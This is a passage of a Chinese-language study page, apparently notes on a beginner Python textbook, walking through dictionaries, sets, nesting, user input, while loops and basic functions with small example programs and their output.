class="string">'phil'</span>: <span class="string">'python'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">print(<span class="string">"The following languages have been mentioned:"</span>)</span><br><span class="line"><span class="keyword">for</span> language <span class="keyword">in</span> favorite_languages.values():</span><br><span class="line">    print(language.title())</span><br></pre></td></tr></table></figure></p><p><code>The following languages have been mentioned:</code><br><code>Python</code><br><code>C</code><br><code>Ruby</code><br><code>Python</code></p><p>这种做法提取字典中所有的值，而没有考虑是否重复。涉及的值很少时，这也许不是问题，但如果被调查者很多，最终的列表可能包含大量的重复项。为剔除重复项，可使用<strong>集合（set）</strong>。<strong>集合</strong>类似于列表，但每个元素都必须是独一无二的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">'jen'</span>: <span class="string">'python'</span>,</span><br><span class="line">    <span class="string">'sarah'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'edward'</span>: <span class="string">'ruby'</span>,</span><br><span class="line">    <span class="string">'phil'</span>: <span class="string">'python'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">print(<span class="string">"The following languages have been mentioned:"</span>)</span><br><span class="line"><span class="keyword">for</span> language <span class="keyword">in</span> set(favorite_languages.values()):</span><br><span class="line">    print(language.title())</span><br></pre></td></tr></table></figure></p><p><code>The following languages have been mentioned:</code><br><code>Ruby</code><br><code>C</code><br><code>Python</code></p><p><strong>嵌套</strong><br>需要将一系列字典存储在列表中，或将列表作为值存储在字典中，这称为<strong>嵌套</strong> 。</p><p><strong>字典列表</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">'color'</span>: <span class="string">'green'</span>, <span class="string">'points'</span>: <span class="number">5</span>&#125;</span><br><span class="line">alien_1 = &#123;<span class="string">'color'</span>: <span class="string">'yellow'</span>, <span class="string">'points'</span>: <span class="number">10</span>&#125;</span><br><span class="line">alien_2 = &#123;<span class="string">'color'</span>: <span class="string">'red'</span>, <span class="string">'points'</span>: <span class="number">15</span>&#125;</span><br><span class="line">aliens = [alien_0, alien_1, alien_2]</span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens:</span><br><span class="line">    print(alien)</span><br></pre></td></tr></table></figure></p><p><code>{&#39;color&#39;: &#39;green&#39;, &#39;points&#39;: 5}</code><br><code>{&#39;color&#39;: &#39;yellow&#39;, &#39;points&#39;: 10}</code><br><code>{&#39;color&#39;: &#39;red&#39;, &#39;points&#39;: 15}</code></p><p><strong>在字典中存储列表</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 存储所点比萨的信息</span></span><br><span class="line">pizza = &#123;</span><br><span class="line">    <span class="string">'crust'</span>: <span class="string">'thick'</span>,</span><br><span class="line">    <span class="string">'toppings'</span>: [<span class="string">'mushrooms'</span>, <span class="string">'extra cheese'</span>],</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 概述所点的比萨</span></span><br><span class="line">print(<span class="string">"You ordered a "</span> + pizza[<span class="string">'crust'</span>] + <span class="string">"-crust pizza "</span> +</span><br><span class="line">        <span class="string">"with the following toppings:"</span>)</span><br><span class="line"><span class="keyword">for</span> topping <span class="keyword">in</span> pizza[<span class="string">'toppings'</span>]:</span><br><span class="line">    print(<span class="string">"\t"</span> + topping)</span><br></pre></td></tr></table></figure></p><p><code>You ordered a thick-crust pizza with the following toppings:</code><br><code>mushrooms</code><br><code>extra cheese</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">'jen'</span>: [<span class="string">'python'</span>, <span class="string">'ruby'</span>],</span><br><span class="line">    <span class="string">'sarah'</span>: [<span class="string">'c'</span>],</span><br><span class="line">    <span class="string">'edward'</span>: [<span class="string">'ruby'</span>, <span class="string">'go'</span>],</span><br><span class="line">    <span class="string">'phil'</span>: [<span class="string">'python'</span>, <span class="string">'haskell'</span>],</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> name, languages <span class="keyword">in</span> favorite_languages.items():</span><br><span class="line">    print(<span class="string">"\n"</span> + name.title() + <span class="string">"'s favorite languages are:"</span>)</span><br><span class="line">    <span class="keyword">for</span> language <span class="keyword">in</span> languages:</span><br><span class="line">        print(<span class="string">"\t"</span> + language.title())</span><br></pre></td></tr></table></figure><p><code>Jen&#39;s favorite languages are:</code><br><code>​    Python</code><br><code>​    Ruby</code></p><p><code>Sarah&#39;s favorite languages are:</code><br><code>​    C</code></p><p><code>Edward&#39;s favorite languages are:</code><br><code>​    Ruby</code><br><code>​    Go</code></p><p><code>Phil&#39;s favorite languages are:</code><br><code>​    Python</code><br><code>​    Haskell</code></p><p><strong>在字典中存储字典</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">users = &#123;</span><br><span class="line">    <span class="string">'aeinstein'</span>: &#123;</span><br><span class="line">        <span class="string">'first'</span>: <span class="string">'albert'</span>,</span><br><span class="line">        <span class="string">'last'</span>: <span class="string">'einstein'</span>,</span><br><span class="line">        <span class="string">'location'</span>: <span class="string">'princeton'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="string">'mcurie'</span>: &#123;</span><br><span class="line">        <span class="string">'first'</span>: <span class="string">'marie'</span>,</span><br><span class="line">        <span class="string">'last'</span>: <span class="string">'curie'</span>,</span><br><span class="line">        <span class="string">'location'</span>: <span class="string">'paris'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> username, user_info <span class="keyword">in</span> users.items():</span><br><span class="line">    print(<span class="string">"\nUsername: "</span> + username)</span><br><span class="line">    full_name = user_info[<span class="string">'first'</span>] + <span class="string">" "</span> + user_info[<span class="string">'last'</span>]</span><br><span class="line">    location = user_info[<span class="string">'location'</span>]</span><br><span class="line">    print(<span class="string">"\tFull name: "</span> + full_name.title())</span><br><span class="line">    print(<span class="string">"\tLocation: "</span> + location.title())</span><br></pre></td></tr></table></figure></p><p><code>Username: aeinstein</code><br>​    <code>Full name: Albert Einstein</code><br>​    <code>Location: Princeton</code></p><p><code>Username: mcurie</code><br>​    <code>Full name: Marie Curie</code><br>​    <code>Location: Paris</code></p><h2 id="用户输入和while循环"><a href="#用户输入和while循环" class="headerlink" title="用户输入和while循环"></a>用户输入和while循环</h2><p>函数input() 让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量中，以方便你使用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message = input(<span class="string">"Tell me something, and I will repeat it back to you: "</span>)</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure></p><p><code>Tell me something, and I will repeat it back to you: Hello everyone</code><br><code>Hello everyone</code></p><p>函数input() 接受一个<strong>参数</strong>：<strong>即要向用户显示的提示或说明</strong>，让用户知道该如何做。在这个示例中，Python运行第1行代码时，用户将看到提示Tell me something, andI will repeat it back to you: 。程序等待用户输入，并在用户按回车键后继续运行。输入存储在变量message 中，<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prompt = <span class="string">"If you tell us who you are, we can personalize the messages you see."</span></span><br><span class="line">prompt += <span class="string">"\nWhat is your first name? "</span></span><br><span class="line">name = input(prompt)</span><br><span class="line">print(<span class="string">"\nHello, "</span> + name + <span class="string">"!"</span>)</span><br></pre></td></tr></table></figure></p><p><code>If you tell us who you are, we can personalize the messages you see.</code><br><code>What is your first name? Peter</code></p><p><code>Hello, Peter!</code></p><p><strong>使用int() 来获取数值输入</strong><br>使用函数input() 时，Python将用户输入解读为字符串.<br>可以使用int( )来整数化变量。</p><p><strong>求模运算符</strong></p><p>求模运算符 （%）是一个很有用的工具，它将两个数相除并返回余数：</p><p><strong>while 循环简介</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prompt = &quot;\nTell me something, and I will repeat it back to you:&quot;</span><br><span class="line">prompt += &quot;\nEnter &apos;quit&apos; to end the program. &quot;</span><br><span class="line">message = &quot;&quot;</span><br><span class="line">while message != &apos;quit&apos;:</span><br><span class="line">    message = input(prompt)</span><br><span class="line">    print(message)</span><br></pre></td></tr></table></figure></p><p><code>Tell me something, and I will repeat it back to you:</code><br><code>Enter &#39;quit&#39; to end the program. qiure</code><br><code>qiure</code></p><p><code>Tell me something, and I will repeat it back to you:</code><br><code>Enter &#39;quit&#39; to end the program. quitr</code><br><code>quitr</code></p><p><code>Tell me something, and I will repeat it back to you:</code><br><code>Enter &#39;quit&#39; to end the program. quit</code><br><code>quit</code></p><p><strong>使用标志</strong><br>在要求很多条件都满足才继续运行的程序中，可定义一个变量，用于判断整个程序是否处于活动状态。这个变量被称为<strong>标志</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">prompt = <span class="string">"\nTell me something, and I will repeat it back to you:"</span></span><br><span class="line">prompt += <span class="string">"\nEnter 'quit' to end the program. "</span></span><br><span class="line">active = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span> active:</span><br><span class="line">    message = input(prompt)</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">'quit'</span>:</span><br><span class="line">        active = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure><p><code>Tell me something, and I will repeat it back to you:</code><br><code>Enter &#39;quit&#39; to end the program. vcfvvqd23rdvc nht,l[p</code><br><code>vcfvvqd23rdvc nht,l[p</code></p><p><code>Tell me something, and I will repeat it back to you:</code><br><code>Enter &#39;quit&#39; to end the program. quit</code></p><p><strong>使用break 退出循环</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">prompt = <span class="string">"\nPlease enter the name of a city you have visited:"</span></span><br><span class="line">prompt += <span class="string">"\n(Enter 'quit' when you are finished.) "</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    city = input(prompt)</span><br><span class="line">    <span class="keyword">if</span> city == <span class="string">'quit'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"I'd love to go to "</span> + city.title() + <span class="string">"!"</span>)</span><br></pre></td></tr></table></figure><p><strong>在循环中使用continue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">current_number = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt; <span class="number">10</span>:</span><br><span class="line">    current_number += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> current_number % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(current_number)</span><br></pre></td></tr></table></figure><p><code>1</code><br><code>3</code><br><code>5</code><br><code>7</code><br><code>9</code></p><p><strong>避免无限循环</strong></p><p><strong>使用while 循环来处理列表和字典</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先，创建一个待验证用户列表</span></span><br><span class="line"><span class="comment"># 和一个用于存储已验证用户的空列表</span></span><br><span class="line">unconfirmed_users = [<span class="string">'alice'</span>, <span class="string">'brian'</span>, <span class="string">'candace'</span>]</span><br><span class="line">confirmed_users = []</span><br><span class="line"><span class="comment"># 验证每个用户，直到没有未验证用户为止</span></span><br><span class="line"><span class="comment"># 将每个经过验证的列表都移到已验证用户列表中</span></span><br><span class="line"><span class="keyword">while</span> unconfirmed_users:</span><br><span class="line">    current_user = unconfirmed_users.pop()</span><br><span class="line">    print(<span class="string">"Verifying user: "</span> + current_user.title())</span><br><span class="line">    confirmed_users.append(current_user)</span><br><span class="line"><span class="comment"># 显示所有已验证的用户</span></span><br><span class="line">print(<span class="string">"\nThe following users have been confirmed:"</span>)</span><br><span class="line"><span class="keyword">for</span> confirmed_user <span class="keyword">in</span> confirmed_users:</span><br><span class="line">    print(confirmed_user.title())</span><br></pre></td></tr></table></figure><p><code>Verifying user: Candace</code><br><code>Verifying user: Brian</code><br><code>Verifying user: Alice</code></p><p><code>The following users have been confirmed:</code><br><code>Candace</code><br><code>Brian</code><br><code>Alice</code></p><p><strong>删除包含特定值的所有列表元素</strong></p><p>使用函数remove() 来删除列表中的特定值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pets = [<span class="string">'dog'</span>, <span class="string">'cat'</span>, <span class="string">'dog'</span>, <span class="string">'goldfish'</span>, <span class="string">'cat'</span>, <span class="string">'rabbit'</span>, <span class="string">'cat'</span>]</span><br><span class="line">print(pets)</span><br><span class="line"><span class="keyword">while</span> <span class="string">'cat'</span> <span class="keyword">in</span> pets:</span><br><span class="line">    pets.remove(<span class="string">'cat'</span>)</span><br><span class="line">print(pets)</span><br></pre></td></tr></table></figure></p><p><code>[&#39;dog&#39;, &#39;cat&#39;, &#39;dog&#39;, &#39;goldfish&#39;, &#39;cat&#39;, &#39;rabbit&#39;, &#39;cat&#39;]</code><br><code>[&#39;dog&#39;, &#39;dog&#39;, &#39;goldfish&#39;, &#39;rabbit&#39;]</code></p><p><strong>使用用户输入来填充字典</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">responses = &#123;&#125;</span><br><span class="line"><span class="comment"># 设置一个标志，指出调查是否继续</span></span><br><span class="line">polling_active = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span> polling_active:</span><br><span class="line"><span class="comment"># 提示输入被调查者的名字和回答</span></span><br><span class="line">    name = input(<span class="string">"\nWhat is your name? "</span>)</span><br><span class="line">    response = input(<span class="string">"Which mountain would you like to climb someday? "</span>)</span><br><span class="line"><span class="comment"># 将答卷存储在字典中</span></span><br><span class="line">    responses[name] = response</span><br><span class="line"><span class="comment"># 看看是否还有人要参与调查</span></span><br><span class="line">    repeat = input(<span class="string">"Would you like to let another person respond? (yes/ no) "</span>)</span><br><span class="line">    <span class="keyword">if</span> repeat == <span class="string">'no'</span>:</span><br><span class="line">        polling_active = <span class="keyword">False</span></span><br><span class="line"><span class="comment"># 调查结束，显示结果</span></span><br><span class="line">print(<span class="string">"\n--- Poll Results ---"</span>)</span><br><span class="line"><span class="keyword">for</span> name, response <span class="keyword">in</span> responses.items():</span><br><span class="line">    print(name + <span class="string">" would like to climb "</span> + response + <span class="string">"."</span>)</span><br></pre></td></tr></table></figure><p><code>What is your name? peter</code><br><code>Which mountain would you like to climb someday? A</code><br><code>Would you like to let another person respond? (yes/ no) yes</code></p><p><code>What is your name? alex</code>Which mountain would you like to climb someday? B<br>`Would you like to let another person respond? (yes/ no) yes</p><p><code>What is your name? bill</code><br><code>Which mountain would you like to climb someday? C</code><br><code>Would you like to let another person respond? (yes/ no) e</code></p><p><code>What is your name? Wow</code><br><code>Which mountain would you like to climb someday? D</code><br><code>Would you like to let another person respond? (yes/ no) no</code></p><p><code>--- Poll Results ---</code><br><code>peter would like to climb A.</code><br><code>alex would like to climb B.</code><br><code>bill would like to climb C.</code><br><code>Wow would like to climb D.</code></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>定义函数</strong></p><p>关键字def 来告诉Python你要定义一个函数。这是函数定义 ，向Python指出了函数名，还可能在括号内指出函数为完成其任务需要什么样的信息。<em>文本</em>是被称为<strong>文档字符串 （docstring）</strong>的注释，描述了函数是做什么的。文档字符串用三引号括起，Python使用它们来生成有关程序中函数的文档。<br>函数调用 让Python执行函数的代码。要调用 函数，可依次指定函数名以及用括号括起的必要信息.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_user</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""显示简单的问候语"""</span></span><br><span class="line">    print(<span class="string">"Hello!"</span>)</span><br><span class="line">greet_user()</span><br></pre></td></tr></table></figure><p><code>Hello!</code></p><p><strong>向函数传递信息</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_user</span><span class="params">(username)</span>:</span></span><br><span class="line">    <span class="string">"""显示简单的问候语"""</span></span><br><span class="line">    print(<span class="string">"Hello, "</span> + username.title() + <span class="string">"!"</span>)</span><br><span class="line">greet_user(<span class="string">'jesse'</span>)</span><br></pre></td></tr></table></figure></p><p><code>Hello, Jesse!</code></p><p><strong>实参和形参</strong></p><p>在函数greet_user() 的定义中，变量username 是一个形参 ——函数完成其工作所需的一项信息。在代码greet_user(‘jesse’) 中，值’jesse’ 是一个实参 。实参是调用函数时传递给函数的信息。我们调用函数时，将要让函数使用的信息放在括号内。在greet_user(‘jesse’) 中，将实参’jesse’ 传递给了函数greet_user() ，这个值被存储在形参username 中。</p><p><strong>传递实参</strong></p><p><strong>位置实参</strong></p><p>是基于实参的顺序。这种关联方式被称为位置实参</p><ul><li>调用函数多次</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">describe_pet</span><span class="params">(animal_type, pet_name)</span>:</span></span><br><span class="line">    <span class="string">"""显示宠物的信息"""</span></span><br><span class="line">    print(<span class="string">"\nI have a "</span> + animal_type + <span class="string">"."</span>)</span><br><span class="line">    print(<span class="string">"My "</span> + animal_type + <span class="string">"'s name is "</span> + pet_name.title() + <span class="string">"."</span>)</span><br><span class="line"></span><br><span class="line">describe_pet(<span class="string">'hamster'</span>, <span class="string">'harry'</span>)</span><br><span class="line">describe_pet(<span class="string">'dog'</span>, <span class="string">'willie'</span>)</span><br></pre></td></tr></table></figure><p><code>I have a hamster.</code><br><code>My hamster&#39;s name is Harry.</code></p><p><code>I have a dog.</code><br><code>My dog&#39;s name is Willie.</code></p><ul><li>位置实参的顺序很重要</li></ul><p><strong>关键字实参</strong></p><p>关键字实参 是传递给函数的名称—值对</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">describe_pet</span><span class="params">(animal_type, pet_name)</span>:</span></span><br><span class="line">    <span class="string">"""显示宠物的信息"""</span></span><br><span class="line">    print(<span class="string">"\nI have a "</span> + animal_type + <span class="string">"."</span>)</span><br><span class="line">    print(<span class="string">"My "</span> + animal_type + <span class="string">"'s name is "</span> + pet_name.title() + <span class="string">"."</span>)</span><br><span class="line">describe_pet(animal_type=<span class="string">'hamster'</span>, pet_name=<span class="string">'harry'</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">'harry'</span>, animal_type=<span class="string">'hamster'</span>)</span><br></pre></td></tr></table></figure><p><code>I have a hamster.</code><br><code>My hamster&#39;s name is Harry.</code></p><p><code>I have a hamster.</code><br><code>My hamster&#39;s name is Harry.</code></p><p><strong>默认值</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">describe_pet</span><span class="params">(pet_name, animal_type=<span class="string">'dog'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""显示宠物的信息"""</span></span><br><span class="line">    print(<span class="string">"\nI have a "</span> + animal_type + <span class="string">"."</span>)</span><br><span class="line">    print(<span class="string">"My "</span> + animal_type + <span class="string">"'s name is "</span> + pet_name.title() + <span class="string">"."</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">'willie'</span>)</span><br></pre></td></tr></table></figure></p><p><code>I have a dog.</code><br><code>My dog&#39;s name is Willie.</code></p><p><strong>等效的函数调用</strong></p><p>鉴于可混合使用位置实参、关键字实参和默认值，通常有多种等效的函数调用方式。</p><p><strong>返回值</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span><span class="params">(first_name, last_name)</span>:</span></span><br><span class="line">    <span class="string">"""返回整洁的姓名"""</span></span><br><span class="line">    full_name = first_name + <span class="string">' '</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line">musician = get_formatted_name(<span class="string">'jimi'</span>, <span class="string">'hendrix'</span>)</span><br><span class="line">print(musician)</span><br></pre></td></tr></table></figure></p><p><code>Jimi Hendrix</code></p><p><strong>让实参变成可选的</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span><span class="params">(first_name, last_name, middle_name=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="string">"""返回整洁的姓名"""</span></span><br><span class="line">    <span class="keyword">if</span> middle_name:</span><br><span class="line">        full_name = first_name + <span class="string">' '</span> + middle_name + <span class="string">' '</span> + last_name</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        full_name = first_name + <span class="string">' '</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line">musician = get_formatted_name(<span class="string">'jimi'</span>, <span class="string">'hendrix'</span>)</span><br><span class="line">print(musician)</span><br><span class="line">musician = get_formatted_name(<span class="string">'john'</span>, <span class="string">'hooker'</span>, <span class="string">'lee'</span>)</span><br><span class="line">print(musician)</span><br></pre></td></tr></table></figure><p><code>Jimi Hendrix</code><br><code>John Lee Hooker</code></p><p><strong>返回字典</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_person</span><span class="params">(first_name, last_name)</span>:</span></span><br><span class="line">    <span class="string">"""返回一个字典，其中包含有关一个人的信息"""</span></span><br><span class="line">    person = &#123;<span class="string">'first'</span>: first_name, <span class="string">'last'</span>: last_name&#125;</span><br><span class="line">    <span class="keyword">return</span> person</span><br><span class="line">musician = build_person(<span class="string">'jimi'</span>, <span class="string">'hendrix'</span>)</span><br><span class="line">print(musician)</span><br></pre></td></tr></table></figure><p><code>{&#39;first&#39;: &#39;jimi&#39;, &#39;last&#39;: &#39;hendrix&#39;}</code></p><p><strong>结合使用函数和while 循环</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span><span class="params">(first_name, last_name)</span>:</span></span><br><span class="line">    <span class="string">"""返回整洁的姓名"""</span></span><br><span class="line">    full_name = first_name + <span class="string">' '</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(<span class="string">"\nPlease tell me your name:"</span>)</span><br><span class="line">    print(<span class="string">"(enter 'q' at any time to quit)"</span>)</span><br><span class="line">    f_name = input(<span class="string">"First name: "</span>)</span><br><span class="line">    <span class="keyword">if</span> f_name == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    l_name = input(<span class="string">"Last name: "</span>)</span><br><span class="line">    <span class="keyword">if</span> l_name == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    formatted_name = get_formatted_name(f_name, l_name)</span><br><span class="line">    print(<span class="string">"\nHello, "</span> + formatted_name + <span class="string">"!"</span>)</span><br></pre></td></tr></table></figure><p><code>Please tell me your name:</code><br><code>(enter &#39;q&#39; at any time to quit)</code><br><code>First name: fwfcxv</code><br><code>Last name: ewew</code></p><p><code>Hello, Fwfcxv Ewew!</code></p><p><code>Please tell me your name:</code><br><code>(enter &#39;q&#39; at any time to quit)</code><br><code>First name: efwefw</code><br><code>Last name: q</code></p><p><strong>传递列表</strong></p><p>向函数传递列表很有用，这种列表包含的可能是名字、数字或更复杂的对象（如字典）。将列表传递给函数后，函数就能直接访问其内容。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_users</span><span class="params">(names)</span>:</span></span><br><span class="line">    <span class="string">"""向列表中的每位用户都发出简单的问候"""</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        msg = <span class="string">"Hello, "</span> + name.title() + <span class="string">"!"</span></span><br><span class="line">        print(msg)</span><br><span class="line">usernames = [<span class="string">'hannah'</span>, <span class="string">'ty'</span>, <span class="string">'margot'</span>]</span><br><span class="line">greet_users(usernames)</span><br></pre></td></tr></table></figure></p><p><code>Hello, Hannah!</code><br><code>Hello, Ty!</code><br><code>Hello, Margot!</code></p><p><strong>在函数中修改列表</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_models</span><span class="params">(unprinted_designs, completed_models)</span>:</span></span><br><span class="line">    <span 